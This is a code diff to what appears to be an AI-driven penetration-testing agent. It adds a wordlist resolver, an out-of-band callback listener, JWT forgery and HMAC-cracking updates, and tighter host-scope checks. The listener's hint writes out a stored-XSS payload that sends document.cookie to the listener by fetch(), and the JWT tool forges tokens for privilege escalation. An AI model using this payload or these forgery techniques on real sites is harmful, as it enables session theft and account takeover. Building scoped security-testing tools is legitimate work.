@@ -9,6 +9,7 @@ manages target task context, and triages verified findings.
 from dataclasses import dataclass
 from datetime import datetime, timezone
 import base64
+import difflib
 import hashlib
 import hmac
 import json
@@ -26,7 +27,7 @@ import requests
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-from hellhound.core.scope import is_in_scope, check_module_against_rules
+from hellhound.core.scope import is_in_scope, check_module_against_rules, normalize_host
 from hellhound.core.tasks import Target, create_or_load_target, save_target, sanitize_target_name
 from hellhound.core.guard import AutopilotGuard
 from hellhound.core.ai_utils import (
@@ -120,6 +121,143 @@ def _resolve_resolvers_path() -> str:
     if not default_res.exists() or default_res.stat().st_size == 0:
         default_res.write_text("1.1.1.1\n8.8.8.8\n9.9.9.9\n8.8.4.4\n1.0.0.1\n")
     return str(default_res)
+
+
+# Every root a wordlist realistically lives under on a hunting box — not just
+# the repo's own bundled fallback. Covers Kali's standard system locations
+# (both the /usr/share/wordlists symlink farm and the real /usr/share/seclists
+# tree), the classic dirb/dirbuster/wfuzz/amass package dirs, common manual
+# SecLists clone spots, and the researcher's own home-directory conventions
+# (~/HACK-HUB is this researcher's actual layout — see resolvers above).
+_WORDLIST_SEARCH_ROOTS = [
+    "/usr/share/wordlists",
+    "/usr/share/seclists",
+    "/usr/share/dirb/wordlists",
+    "/usr/share/dirbuster",
+    "/usr/share/wfuzz/wordlist",
+    "/usr/share/amass/wordlists",
+    "/opt/SecLists",
+    "/opt/wordlists",
+    str(Path.home() / "HACK-HUB"),
+    str(Path.home() / "wordlists"),
+    str(Path.home() / "SecLists"),
+    str(Path.home() / ".local" / "share" / "wordlists"),
+]
+
+
+def _decompress_if_gz(path: Path) -> Path:
+    """Kali ships rockyou.txt as rockyou.txt.gz; most fuzzing tools (ffuf,
+    shuffledns) can't read gzip directly. Decompress once into a cached
+    plaintext copy under ~/.hellhound/wordlist_cache and reuse it after."""
+    if path.suffix != ".gz":
+        return path
+    cache_dir = Path.home() / ".hellhound" / "wordlist_cache"
+    try:
+        cache_dir.mkdir(parents=True, exist_ok=True)
+        dest = cache_dir / path.stem  # strips the .gz
+        if not dest.exists() or dest.stat().st_size == 0:
+            import gzip
+            import shutil
+            with gzip.open(path, "rb") as f_in, open(dest, "wb") as f_out:
+                shutil.copyfileobj(f_in, f_out)
+        return dest
+    except Exception:
+        return path  # best-effort — caller's existence check will just fail through
+
+
+def _resolve_wordlist(category: str, explicit: str = "",
+                       curated_candidates: Optional[List[Path]] = None,
+                       emit: Any = None) -> Optional[str]:
+    """
+    Resolve a wordlist for DNS/vhost/content fuzzing tools. Search order:
+      1. `explicit` as a literal path — used as-is if it exists.
+      2. `explicit` as a bare name (e.g. 'rockyou', 'raft-large-directories',
+         'dirb') — case-insensitive filename search across every standard
+         Linux wordlist location (SecLists, dirb, dirbuster, wfuzz, amass,
+         and the researcher's own ~/HACK-HUB or ~/SecLists clones), so the
+         researcher can say "use rockyou" / "use the raft list" without
+         knowing the exact path on this particular box.
+      3. `curated_candidates` — the caller's fast, known-good defaults for
+         this category (unchanged behavior when no explicit wordlist is
+         given — this stays the common-case path with zero extra latency).
+      4. A best-effort broad search of the standard roots by category
+         keyword, as a last resort before giving up entirely.
+    Transparently decompresses a .gz hit (e.g. rockyou.txt.gz) into a cached
+    plaintext copy.
+    """
+    def _pick(p: Path) -> Optional[str]:
+        try:
+            if p.exists() and p.is_file() and p.stat().st_size > 0:
+                return str(_decompress_if_gz(p))
+        except OSError:
+            pass
+        return None
+
+    def _bounded_rglob(root_path: Path, cap: int = 20000):
+        # rglob is lazy — cap how many entries we walk so a huge tree
+        # (a full SecLists clone is tens of thousands of files) can't turn
+        # a single tool call into a multi-minute filesystem crawl.
+        for i, f in enumerate(root_path.rglob("*")):
+            if i >= cap:
+                return
+            yield f
+
+    if explicit:
+        # 1. Literal path
+        hit = _pick(Path(explicit).expanduser())
+        if hit:
+            return hit
+
+        # 2. Bare name — search known roots for a filename match
+        needle = explicit.strip().lower().replace(" ", "-").replace(".txt", "")
+        matches = []
+        for root in _WORDLIST_SEARCH_ROOTS:
+            root_path = Path(root)
+            if not root_path.exists():
+                continue
+            try:
+                for f in _bounded_rglob(root_path):
+                    if f.is_file() and needle in f.name.lower():
+                        matches.append(f)
+            except (PermissionError, OSError):
+                continue
+        if matches:
+            matches.sort(key=lambda f: f.stat().st_size, reverse=True)
+            if emit and hasattr(emit, "info"):
+                emit.info(f"[*] Resolved wordlist '{explicit}' -> {matches[0]}")
+            hit = _pick(matches[0])
+            if hit:
+                return hit
+        if emit and hasattr(emit, "warn"):
+            emit.warn(f"[!] Requested wordlist '{explicit}' not found on disk or in standard locations — falling back to default.")
+
+    # 3. Curated known-good candidates for this category (default fast path)
+    for wc in (curated_candidates or []):
+        hit = _pick(Path(wc))
+        if hit:
+            return hit
+
+    # 4. Best-effort broad search by category keyword
+    category_hints = {
+        "dns": ("dns", "subdomain"),
+        "vhost": ("vhost", "subdomain", "dns"),
+        "content": ("common", "directory", "raft", "content"),
+    }.get(category, ())
+    if category_hints:
+        for root in _WORDLIST_SEARCH_ROOTS:
+            root_path = Path(root)
+            if not root_path.exists():
+                continue
+            try:
+                for f in _bounded_rglob(root_path):
+                    if f.is_file() and any(h in f.name.lower() for h in category_hints):
+                        hit = _pick(f)
+                        if hit:
+                            return hit
+            except (PermissionError, OSError):
+                continue
+
+    return None
 
 
 def _execute_shuffledns(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
@@ -2108,9 +2246,79 @@ COMMON_JWT_SECRETS = (
 )
 
 
+def _execute_listener(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
+    """
+    Start or poll a local out-of-band (OOB) HTTP listener, for confirming
+    blind or stored vulns where there's no direct response leakage to check
+    against — e.g. stored/blind XSS exfiltrating document.cookie via
+    fetch(), blind SSRF, blind SQLi/XXE. Previously this listener
+    (oob_utils.OOBServer) existed fully working but was never wired into
+    the tool registry, so there was no way to actually spin one up.
+    """
+    from hellhound.core.oob_utils import get_or_create_oob_server
+
+    action = (args.get("action") or "start").lower()
+    srv = get_or_create_oob_server(target.name)
+
+    if action == "start":
+        host, port = srv.start()
+        if not host:
+            return {"status": "error", "error": "Could not bind a local listener port (8000-9000 all appear in use)."}
+        url = srv.get_url()
+        return {
+            "status": "success",
+            "listener_url": url,
+            "hint": (
+                f"Listener is live at {url} and will stay up for the rest of this "
+                f"session. Embed it in the payload so the target calls back to it — "
+                f"e.g. for stored XSS cookie theft: "
+                f"<script>fetch('{url}/c?x='+document.cookie)</script>. Put a unique "
+                f"random token in the callback path or query string so a later "
+                f"poll can match the hit to this specific payload instead of any "
+                f"unrelated noise (e.g. '{url}/c?tok=<random>&x='+document.cookie)."
+            )
+        }
+
+    if action == "poll":
+        token = str(args.get("token", "")).strip()
+        # Cap was already raised to 300s (see comment above) so an explicit
+        # long wait is respected — but the DEFAULT when no timeout is given
+        # was still 10s, and in practice the model kept calling poll with no
+        # explicit timeout (or small ones) and giving up after ~60s total
+        # despite the xss skill itself warning that reviewed/blind payloads
+        # can take much longer than that. Raised the default so a plain
+        # poll(token=...) call — the common case — gets real coverage
+        # instead of quitting almost immediately.
+        timeout = max(1, min(int(args.get("timeout", 45) or 45), 300))
+        if not token:
+            return {
+                "status": "error",
+                "error": "poll requires 'token' — the unique string embedded in the payload's callback URL, used to match hits."
+            }
+        if not srv.host:
+            return {"status": "error", "error": "No listener is running yet for this target. Call action='start' first."}
+        got_hit, raw = srv.poll(token, timeout=timeout)
+        if got_hit:
+            return {"status": "success", "hit": True, "data": raw}
+        return {"status": "success", "hit": False, "note": f"No callback received containing '{token}' within {timeout}s (this poll call actually waited the full requested {timeout}s). Past hits are never discarded — a later poll (even a short one) will still catch a delayed callback, so re-polling after a longer gap works too. If still nothing after a genuinely long wait, the payload likely isn't firing at all (sanitized, not rendered, or no reviewer ever visits the content) rather than just needing more time."}
+
+    if action == "stop":
+        srv.stop()
+        return {"status": "success", "stopped": True}
+
+    return {"status": "error", "error": f"Unknown action '{action}'. Use 'start', 'poll', or 'stop'."}
+
+
 def _execute_jwt_forge(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
     """
     Decode and forge JWTs for privilege escalation and auth bypass testing.
+    Also safely handles the common false-friend case: a dot-separated,
+    base64url-looking cookie (e.g. Flask's default 'session' cookie) that
+    LOOKS like a JWT but is actually a framework-signed session blob with
+    no claims structure. That case still gets fully decoded and returned
+    via 'decoded_session_content' below instead of being turned away —
+    only truly opaque, undecodable IDs (sess_..., connect.sid, PHPSESSID)
+    are rejected outright, since those carry no embedded payload at all.
     Techniques (all run by default via algorithm='all', or select individually):
       - alg:none                unsigned-token bypass, case + trailing-dot variants
       - hs_crack                brute-forces the real HMAC secret against a built-in
@@ -2144,6 +2352,31 @@ def _execute_jwt_forge(args: Dict[str, Any], target: Target, emit: Any) -> Dict[
             "hint": "Inspect target session state. If cookies are opaque (e.g. sess_..., connect.sid, PHPSESSID), the application uses server-side sessions, NOT JWTs. Look for mass assignment, nested property injection, or business logic flaws instead."
         }
 
+    # Terminal-result cache, keyed on the exact token string: whether a
+    # value decodes as a real JWT (valid header+payload) or not is settled
+    # BEFORE 'claims'/'algorithm' are ever read below, so that verdict is
+    # identical no matter what claims/algorithm a later call passes. Without
+    # this, the orchestrator's generic "already ran this exact tool+args"
+    # dedup never fires here — varying claims/algorithm each time makes
+    # every call look like a "new" attempt — and the model can burn several
+    # calls re-testing a question that was already answered for good on the
+    # first one. Cache the verdict per token and refuse instantly on repeats.
+    non_jwt_cache = None
+    if hasattr(target, "state") and isinstance(target.state, dict):
+        non_jwt_cache = target.state.setdefault("_confirmed_non_jwt_tokens", {})
+        if token in non_jwt_cache:
+            return {
+                "status": "error",
+                "error": (
+                    "Bro, we already went through this — same token, same answer: not a JWT. "
+                    "That verdict happens before claims/algorithm are even read, so a different "
+                    "claims or algorithm value isn't going to change it, no matter how many times "
+                    "you ask. Pull whatever you need straight from decoded_session_content below "
+                    "instead of hitting me with this one again."
+                ),
+                "decoded_session_content": non_jwt_cache[token],
+            }
+
     # Strict check: Reject obvious placeholder strings or opaque cookies
     if "..." in token or token.startswith("sess_") or token.count(".") < 1:
         return {
@@ -2151,6 +2384,7 @@ def _execute_jwt_forge(args: Dict[str, Any], target: Target, emit: Any) -> Dict[
             "error": f"The provided token '{token[:30]}...' is not a valid JSON Web Token (JWT). It appears to be an opaque session identifier or placeholder. JWT attacks (alg:none, algorithm confusion) only apply to dot-separated base64url JWTs.",
             "hint": "Do NOT attempt JWT forgery on opaque session cookies. Check application JavaScript and API endpoints for mass assignment (e.g. updating profile/account attributes via PATCH/PUT/POST) or IDOR."
         }
+
 
     def b64url_decode_json(s: str) -> Dict[str, Any]:
         s = s.replace("-", "+").replace("_", "/")
@@ -2186,6 +2420,28 @@ def _execute_jwt_forge(args: Dict[str, Any], target: Target, emit: Any) -> Dict[
         sig = hmac.new(secret_bytes, signing_input, hashlib.sha256).digest()
         return f"{hdr_b64}.{pay_b64}.{b64url_encode(sig)}"
 
+    def try_non_jwt_session_decode(raw_segment: str):
+        """
+        Best-effort decode for dot-separated tokens that LOOK JWT-shaped but
+        aren't — most commonly a framework-signed session cookie like
+        Flask's itsdangerous sessions, which are also '.'-joined and
+        base64url-encoded but carry a plain (optionally zlib-compressed)
+        JSON blob with no JWT header/claims structure. Returns the decoded
+        object if this reads as plausible JSON, else None.
+        """
+        raw = b64url_decode_raw(raw_segment)
+        if not raw:
+            return None
+        try:
+            return json.loads(raw.decode("utf-8"))
+        except Exception:
+            pass
+        try:
+            import zlib
+            return json.loads(zlib.decompress(raw).decode("utf-8"))
+        except Exception:
+            return None
+
     parts = token.strip().split(".")
     if len(parts) < 2:
         return {
@@ -2199,11 +2455,38 @@ def _execute_jwt_forge(args: Dict[str, Any], target: Target, emit: Any) -> Dict[
     original_sig_b64 = parts[2] if len(parts) > 2 else ""
 
     if not header or not payload:
-        return {
+        # Don't just say "decode failed" — show what's actually in there.
+        # Guessing claims (role/isAdmin/admin) blindly against a token that
+        # was never a JWT (e.g. a Flask itsdangerous session cookie, which
+        # is also dot-separated and superficially JWT-shaped) is exactly
+        # what was happening before this fix: repeated forge attempts with
+        # no grounding in the token's real content.
+        raw_previews = []
+        decoded_session_content = None
+        for i, seg in enumerate(parts[:2]):
+            raw_bytes = b64url_decode_raw(seg)
+            if not raw_bytes:
+                continue
+            try:
+                text_preview = raw_bytes[:200].decode("utf-8")
+            except Exception:
+                text_preview = repr(raw_bytes[:200])
+            raw_previews.append(f"segment[{i}]: {text_preview}")
+            if decoded_session_content is None:
+                decoded_session_content = try_non_jwt_session_decode(seg)
+
+        result = {
             "status": "error",
-            "error": "Failed to decode JWT header or payload as valid JSON. The token is not a genuine JWT.",
-            "hint": "Verify the cookie/header value. If it is an opaque session ID, test access control via parameter tampering / mass assignment."
+            "error": "Nah bro, this ain't a JWT — the segments don't even decode to valid JSON. Not going to sit here guessing claims out of thin air, so check raw_content_seen below for what's actually in there.",
+            "raw_content_seen": raw_previews if raw_previews else "Segments did not even base64-decode to bytes.",
+            "hint": "Do not guess/forge claims (role, isAdmin, admin, etc.) here — check raw_content_seen (and decoded_session_content, if present) for what's actually inside before assuming anything about this token. A dot-separated-but-non-JWT shape is common for framework-signed session cookies (e.g. Flask's itsdangerous sessions) carrying plain session/flash data, not auth claims — forging claims against those does nothing. If that's what this is, look for IDOR, mass assignment, or business-logic flaws instead. This is settled for this exact token — do not call jwt_forge on it again with different claims/algorithm values, that will not change anything."
         }
+        if decoded_session_content is not None:
+            result["decoded_session_content"] = decoded_session_content
+            result["error"] = "Nah bro, it's not a JWT — just a plain signed session cookie (see decoded_session_content), no claims or role field in there for you to forge. This one's settled, don't call jwt_forge on it again."
+        if non_jwt_cache is not None:
+            non_jwt_cache[token] = decoded_session_content
+        return result
 
     target_claims = args.get("claims") or {"role": "admin"}
     forged_payload = dict(payload)
@@ -3414,7 +3697,7 @@ TOOL_REGISTRY: Dict[str, ToolSpec] = {
     ),
     "jwt_forge": ToolSpec(
         name="jwt_forge",
-        description="Decode and forge JSON Web Tokens (JWTs) for privilege escalation and auth bypass testing. Only applicable when a valid 3-part 'eyJ...' JWT token is present in the target response or Authorization header. Do NOT use on opaque session cookies (sess_..., connect.sid, PHPSESSID). RECOMMENDED WORKFLOW: call with default algorithm='all' first — this runs only the free, no-secret-needed techniques (alg:none case/format variants, kid header path-traversal to /dev/null, embedded-JWK header self-signing, and RS256->HS256 public-key confusion if public_key_or_secret is given). Test those forged_tokens against the server. Only if all are rejected, escalate by calling again with algorithm='hs_crack' to brute-force the real HMAC secret against a built-in common-secret wordlist — this is deliberately NOT part of the default 'all' bundle, since it's the expensive fallback, not the first move. A hit produces a *legitimately* signed token, not just a bypass guess. The result's 'hs_crack_available' field tells you whether that escalation applies to this token. Automatically updates session state with the primary (best) forged token for subsequent tool calls.",
+        description="Decode ANY dot-separated, base64url-looking token or cookie value you're holding — real JWTs AND framework-signed session cookies (Flask/itsdangerous, and similar) share the same 'segment.segment.segment' shape, and you cannot tell which one you have until you decode it. Call this on every such value, including cookies literally named 'session' — do NOT skip it just because the cookie name doesn't say 'jwt' or 'token'. Do NOT use only on values named sess_/connect.sid/PHPSESSID — those ARE genuinely opaque random IDs with nothing to decode, skip only those. Two outcomes: (1) it's a real JWT (has header+payload claims) — the tool attempts forgery/privilege-escalation techniques against it (alg:none, kid_injection, jwk_injection, hs256 confusion, and hs_crack). (2) it's NOT a real JWT (e.g. a Flask session) — the tool decodes it anyway and returns the raw decoded content in 'decoded_session_content' instead of forging claims; READ THAT CONTENT, since flags, secrets, or other sensitive data are frequently stored directly inside a session payload, especially in CTF-style labs — this is often faster than chasing an out-of-band callback. RECOMMENDED WORKFLOW for real JWTs: call with default algorithm='all' first — this runs only the free, no-secret-needed techniques (alg:none case/format variants, kid header path-traversal to /dev/null, embedded-JWK header self-signing, and RS256->HS256 public-key confusion if public_key_or_secret is given). Test those forged_tokens against the server. Only if all are rejected, escalate by calling again with algorithm='hs_crack' to brute-force the real HMAC secret against a built-in common-secret wordlist — this is deliberately NOT part of the default 'all' bundle, since it's the expensive fallback, not the first move. A hit produces a *legitimately* signed token, not just a bypass guess. The result's 'hs_crack_available' field tells you whether that escalation applies to this token. Automatically updates session state with the primary (best) forged token for subsequent tool calls.",
         parameters={
             "type": "object",
             "properties": {
@@ -3443,6 +3726,30 @@ TOOL_REGISTRY: Dict[str, ToolSpec] = {
             }
         },
         executor=_execute_jwt_forge
+    ),
+    "listener": ToolSpec(
+        name="listener",
+        description="Start or poll a local out-of-band (OOB) HTTP listener to confirm blind or stored vulnerabilities where there's no direct response leakage — stored/blind XSS exfiltrating document.cookie via fetch(), blind SSRF, blind SQLi/XXE, etc. Use action='start' first to get a callback URL, embed that URL (with a unique token) in your payload, deliver the payload, then use action='poll' with that same token to check whether the target called back and what data it sent.",
+        parameters={
+            "type": "object",
+            "properties": {
+                "action": {
+                    "type": "string",
+                    "description": "'start' (spin up the listener and return its callback URL — safe to call again, reuses the same listener), 'poll' (wait up to 'timeout' seconds for a callback containing 'token'), or 'stop' (shut the listener down).",
+                    "default": "start"
+                },
+                "token": {
+                    "type": "string",
+                    "description": "Required for action='poll'. The unique string you embedded in the callback URL used in the payload, so the hit can be matched to this specific test."
+                },
+                "timeout": {
+                    "type": "integer",
+                    "description": "Seconds to wait for a callback during action='poll' (max 300). Default 45. Past hits are never discarded, so a short poll called later will still catch a callback that arrived after an earlier poll's window ended — you don't need one giant timeout to avoid missing a delayed hit. That said, reviewed/moderated submissions (see the xss skill) can take much longer than any single poll window — if several polls come back empty, don't conclude the vector failed; consider a longer wait or re-delivering the payload before ruling it out.",
+                    "default": 45
+                }
+            }
+        },
+        executor=_execute_listener
     ),
     "spider": ToolSpec(
         name="spider",
@@ -3730,23 +4037,109 @@ def _url_in_path_scope(url: str, path_scope: str) -> bool:
     return p == scope or p.startswith(scope + "/")
 
 
+def _strip_payload_context(text: str) -> str:
+    """
+    Strips code/markup spans that are almost certainly payload or example
+    content being discussed — an XSS/SQLi/SSRF string, a PoC snippet — not
+    an actual target designation. Without this, a question like 'is my
+    payload "<img src=x onerror=\"fetch(\'http://host/x\')\">" correct?' has
+    its embedded URL extracted as THE target, silently switching the agent
+    into live recon/attack mode against a host the researcher never asked
+    to be hit — they asked whether a string was well-formed, nothing more.
+    Run before target extraction so payload content can't railroad it.
+    """
+    if not text:
+        return text
+    cleaned = text
+    # Fenced code blocks and inline code spans — almost always examples/PoCs.
+    cleaned = re.sub(r'```[\s\S]*?```', ' ', cleaned)
+    cleaned = re.sub(r'`[^`]*`', ' ', cleaned)
+    # HTML/markup payload span: strip everything from the first '<' to the
+    # last '>' in the message. A quote-pairing regex can't reliably parse
+    # this — HTML attributes routinely nest a quote inside a quote (e.g.
+    # onerror="fetch('...')" sitting inside an outer-quoted "<img ...>"),
+    # which breaks simple non-nested quote matching but doesn't matter at
+    # all here: bracket-bounding just removes the whole tag-like span,
+    # URL and all, regardless of what quoting is inside it.
+    first_lt = cleaned.find('<')
+    last_gt = cleaned.rfind('>')
+    if first_lt != -1 and last_gt != -1 and last_gt > first_lt:
+        cleaned = cleaned[:first_lt] + ' ' + cleaned[last_gt + 1:]
+    return cleaned
+
+
+def _extract_first_balanced_json(text: str) -> Optional[dict]:
+    """
+    Find the first '{' in text and parse the balanced JSON object it opens,
+    by scanning brace depth (string/escape-aware) rather than regex-matching
+    greedily to the LAST '}' anywhere in the text.
+
+    Without this, a tool-call response with one stray trailing character
+    after an otherwise well-formed object — e.g. the model emitting
+    '{"tool": "curl", "args": {...}}}' with one extra closing brace, seen in
+    practice on payload-heavy args like an XSS string containing its own
+    parens/braces — makes the old greedy `\\{[\\s\\S]*\\}` regex capture that
+    trailing junk too, so json.loads fails on the whole thing, the tool call
+    is silently dropped, and the raw malformed JSON was falling through
+    every guard (it doesn't match any narration keyword either) straight to
+    the user as the "final answer" instead of ever executing or retrying.
+    """
+    start = text.find("{")
+    if start == -1:
+        return None
+    depth = 0
+    in_string = False
+    escape = False
+    for i in range(start, len(text)):
+        ch = text[i]
+        if in_string:
+            if escape:
+                escape = False
+            elif ch == "\\":
+                escape = True
+            elif ch == '"':
+                in_string = False
+            continue
+        if ch == '"':
+            in_string = True
+        elif ch == "{":
+            depth += 1
+        elif ch == "}":
+            depth -= 1
+            if depth == 0:
+                candidate = text[start:i + 1]
+                try:
+                    parsed = json.loads(candidate)
+                    return parsed if isinstance(parsed, dict) else None
+                except Exception:
+                    return None
+    return None
+
+
 def extract_target_from_text(user_text: str) -> Optional[str]:
     """
-    Extracts a target domain, IP address, or host from user text.
+    Extracts a target domain, IP address, or host from user text — the RAW
+    match, not filesystem-sanitized (that split happens downstream in
+    create_or_load_target, which needs both the safe folder name AND the
+    real connectable host[:port]; sanitizing here would destroy the colon
+    before it ever reaches that split).
     Handles:
     - Full URLs: http://10.49.135.46/ -> 10.49.135.46
     - IPv4 addresses: 10.49.135.46, 192.168.1.1:8080
     - Standard domain names: example.com, sub.target.ctf.io
     - Local hostnames: localhost, htb.local
+    Payload/code content (quoted HTML/JS snippets, code blocks) is stripped
+    before matching — see _strip_payload_context.
     """
     if not user_text:
         return None
-    url_match = re.search(r'https?://([a-zA-Z0-9._-]+(?::\d+)?)', user_text)
+    scan_text = _strip_payload_context(user_text)
+    url_match = re.search(r'https?://([a-zA-Z0-9._-]+(?::\d+)?)', scan_text)
     if url_match:
-        return sanitize_target_name(url_match.group(1))
-    ip_match = re.search(r'\b(?:\d{1,3}\.){3}\d{1,3}(?::\d+)?\b', user_text)
+        return url_match.group(1)
+    ip_match = re.search(r'\b(?:\d{1,3}\.){3}\d{1,3}(?::\d+)?\b', scan_text)
     if ip_match:
-        return sanitize_target_name(ip_match.group(0))
+        return ip_match.group(0)
     # Domain suffix must be a real TLD — "word.word" alone is not enough.
     # Without this check, any two words separated by a period in an
     # ordinary sentence ("Dr.Doom", "Mr.Robot", "vs.us") gets treated as a
@@ -3763,12 +4156,12 @@ def extract_target_from_text(user_text: str) -> Optional[str]:
         "br", "it", "es", "cn", "kr", "id", "za", "mx", "ch", "se", "no",
         "fi", "dk", "pl", "be", "at", "nz", "ie", "sg", "hk", "tw", "il",
     )
-    dom_match = re.search(r'\b([a-zA-Z0-9][-a-zA-Z0-9]*(?:\.[a-zA-Z0-9][-a-zA-Z0-9]*)*\.([a-zA-Z0-9]{2,}))\b', user_text)
+    dom_match = re.search(r'\b([a-zA-Z0-9][-a-zA-Z0-9]*(?:\.[a-zA-Z0-9][-a-zA-Z0-9]*)*\.([a-zA-Z0-9]{2,}))\b', scan_text)
     if dom_match and dom_match.group(2).lower() in _COMMON_TLDS:
-        return sanitize_target_name(dom_match.group(1))
-    local_match = re.search(r'\b(localhost|htb\.local)\b', user_text, re.IGNORECASE)
+        return dom_match.group(1)
+    local_match = re.search(r'\b(localhost|htb\.local)\b', scan_text, re.IGNORECASE)
     if local_match:
-        return sanitize_target_name(local_match.group(0))
+        return local_match.group(0)
     return None
 
 
@@ -3852,6 +4245,21 @@ class Agent:
         )
         return self.target
 
+    @property
+    def _display_host(self) -> str:
+        """
+        The real, connectable host[:port] for the current target — for
+        anything that builds an actual URL or compares against a live
+        request's netloc. `self.target.name` is the filesystem-safe folder
+        name (colons mangled to underscores by sanitize_target_name) and
+        must NEVER be used for that; "192.168.1.5:8080" as a folder name is
+        "192.168.1.5_8080", which is not a resolvable hostname. Falls back
+        to `.name` only for targets set before this field existed.
+        """
+        if not self.target:
+            return "default"
+        return self.target.host or self.target.name
+
     def _get_trimmed_history(self, max_turns: int = 6, for_chat: bool = False, turn_start_idx: Optional[int] = None) -> List[Dict[str, str]]:
         """
         Returns a sanitized history window for LLM/SLM prompts.
@@ -3932,6 +4340,34 @@ class Agent:
             trimmed.append({"role": h.get("role", "user"), "content": content})
         return trimmed
 
+    @staticmethod
+    def _describe_host_mismatch(active_host: str, cand_host: str) -> str:
+        """
+        Two hosts that differ by one small drifted token (a stray inserted
+        segment, a duplicated octet, etc.) look nearly identical sitting
+        side by side in a wall of log text — the actual difference is easy
+        to miss even though it's a completely different host. Call out
+        exactly what changed instead of just repeating both full strings.
+        """
+        sm = difflib.SequenceMatcher(None, active_host, cand_host)
+        inserted, deleted = [], []
+        for tag, i1, i2, j1, j2 in sm.get_opcodes():
+            if tag == "insert":
+                inserted.append(cand_host[j1:j2])
+            elif tag == "delete":
+                deleted.append(active_host[i1:i2])
+            elif tag == "replace":
+                deleted.append(active_host[i1:i2])
+                inserted.append(cand_host[j1:j2])
+        if sm.ratio() > 0.6 and (inserted or deleted):
+            bits = []
+            if inserted:
+                bits.append(f"an extra '{''.join(inserted)}'")
+            if deleted:
+                bits.append(f"missing '{''.join(deleted)}'")
+            return f"looks like the real target with {' and '.join(bits)} — not the same host"
+        return "a completely different host"
+
     def _extract_target_from_args(self, args: Dict[str, Any]) -> str:
         for key in ("domain", "domains", "target", "url", "subdomain", "subdomains", "host", "hosts", "candidates", "request_ref"):
             if key in args and args[key]:
@@ -3941,7 +4377,7 @@ class Agent:
                 if isinstance(val, str) and "," in val:
                     return str(val.split(",")[0].strip())
                 return str(val)
-        return self.target.name
+        return self._display_host
 
     def execute_tool_call(self, tool_name: str, args: Any, emit: Any = None) -> Dict[str, Any]:
         """
@@ -3972,11 +4408,50 @@ class Agent:
         if self.target and self.target.scope_rules and self.target.scope_rules.in_scope:
             allowed, reason = is_in_scope(target_candidate, self.target.scope_rules)
             if not allowed:
-                msg = f"[!] SCOPE REFUSAL: Action on '{target_candidate}' blocked. Reason: {reason}"
+                msg = f"[!] not doing that — {reason}"
                 if emit and hasattr(emit, "warn"):
                     emit.warn(msg)
                 return {
                     "error": f"SCOPE_VIOLATION: {reason}",
+                    "target": target_candidate,
+                    "blocked": True
+                }
+        elif self.target and self.target.name and target_candidate and tool_name != "run_terminal_command":
+            # No explicit /scope in_scope list has been configured (the
+            # researcher just said "your target is X" in plain chat). That
+            # is NOT an invitation to test anything the model decides to —
+            # it should still mean exactly one host. Pin every tool call's
+            # target to the active target's own host so a hallucinated or
+            # garbled URL (a real observed failure mode: the model inventing
+            # a URL that superficially resembles the target but isn't it)
+            # can't silently reach a completely different host.
+            #
+            # IMPORTANT: compare against target.host (the real, connectable
+            # host[:port] — see extract_raw_host()), never target.name.
+            # target.name is the filesystem-safe folder name and mangles
+            # ":" to "_" (e.g. "10.49.182.225:5000" -> "10.49.182.225_5000"),
+            # which normalize_host() would then read back as a bogus
+            # hostname — blocking every legitimate call against the real
+            # target. This was caught in review: it broke the very first
+            # request in a live session.
+            active_reference = self.target.host or self.target.name
+            active_host, _ = normalize_host(active_reference)
+            cand_host, _ = normalize_host(target_candidate)
+            if active_host and cand_host and active_host != cand_host and not cand_host.endswith("." + active_host):
+                mismatch = self._describe_host_mismatch(active_host, cand_host)
+                msg = (
+                    f"[!] not doing that — '{cand_host}' {mismatch} "
+                    f"(active target is '{active_host}'). If '{cand_host}' is really a second host "
+                    f"you want tested, set it with /scope first."
+                )
+                if emit and hasattr(emit, "warn"):
+                    emit.warn(msg)
+                return {
+                    "error": (
+                        f"SCOPE_VIOLATION: '{cand_host}' {mismatch} (active target: '{active_host}'). "
+                        f"No /scope is configured to authorize a second host — retry against the active "
+                        f"target's actual host, or ask the user to confirm/add the new one via /scope."
+                    ),
                     "target": target_candidate,
                     "blocked": True
                 }
@@ -3991,7 +4466,7 @@ class Agent:
                     parsed = urlparse(str(url_candidate))
                     clean_scope = "/" + self._turn_path_scope.strip("/.,;:!?)>\"'")
                     if parsed.scheme and parsed.netloc:
-                        if self.target.name in parsed.netloc or parsed.netloc in self.target.name:
+                        if self._display_host in parsed.netloc or parsed.netloc in self._display_host:
                             new_path = f"{clean_scope}{parsed.path}"
                             new_url = f"{parsed.scheme}://{parsed.netloc}{new_path}"
                             if parsed.query:
@@ -4016,7 +4491,7 @@ class Agent:
                 if not _url_in_path_scope(str(url_candidate), self._turn_path_scope):
                     reason = (
                         f"Requested URL '{url_candidate}' is outside the active path scope ('{self._turn_path_scope}'). "
-                        f"All tool calls MUST be formatted with the prefix '{self._turn_path_scope}' (e.g. 'https://{self.target.name}{self._turn_path_scope}/dashboard' or 'https://{self.target.name}{self._turn_path_scope}/api/...'). "
+                        f"All tool calls MUST be formatted with the prefix '{self._turn_path_scope}' (e.g. 'https://{self._display_host}{self._turn_path_scope}/dashboard' or 'https://{self._display_host}{self._turn_path_scope}/api/...'). "
                         f"Do NOT send requests to out-of-scope paths."
                     )
                     if emit and hasattr(emit, "warn"):
@@ -4191,7 +4666,14 @@ class Agent:
         domain_match = target_match
         if target_match:
             detected_target = target_match
-            if self.target.name == "default" or (self.target.name != detected_target):
+            # Compare sanitized forms — target_match is now the RAW host
+            # (needed downstream to populate Target.host correctly), but
+            # self.target.name is always the sanitized folder name. Comparing
+            # raw-to-sanitized directly would mismatch on every single turn
+            # even when the target hasn't changed, spuriously calling
+            # set_target() each time and wiping path-scope/rate-limiter state
+            # that should persist across the conversation.
+            if self.target.name == "default" or (self.target.name != sanitize_target_name(detected_target)):
                 self.set_target(detected_target)
         elif self.target.name == "default" and self.target.scope_rules.in_scope:
             primary_target = self.target.scope_rules.in_scope[0].lstrip("*.")
@@ -4276,7 +4758,7 @@ class Agent:
         def _get_orchestrator_system_prompt() -> str:
             path_scope_prompt = ""
             if self._turn_path_scope:
-                path_scope_prompt = f"\nACTIVE LAB PATH SCOPE: '{self._turn_path_scope}' (ALL tool URLs MUST begin with 'https://{self.target.name}{self._turn_path_scope}/...'; root '/' and other paths are out of scope)\n"
